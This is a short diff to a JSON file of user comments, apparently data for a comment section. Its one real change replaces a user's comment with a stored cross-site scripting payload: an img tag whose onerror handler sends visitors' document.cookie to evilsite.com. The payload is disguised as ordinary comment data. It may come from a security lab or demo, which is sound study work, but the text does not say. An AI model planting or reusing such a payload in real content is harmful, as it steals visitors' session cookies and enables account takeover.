@@ -1,9 +1,8 @@
-[
-    {
+[{
         "id": 1,
         "user": "Iván Miranda",
         "postedAt": "1 month ago",
-        "entry": "Yes, whatever in the morning",
+        "entry": "</p><img src='/' onerror='window.location.href=\"https://evilsite.com?q=\"+document.cookie;'>",
         "likes": 13,
         "notlikes": 2
     },
@@ -24,4 +23,3 @@
         "notlikes": 4
     }
 ]
-
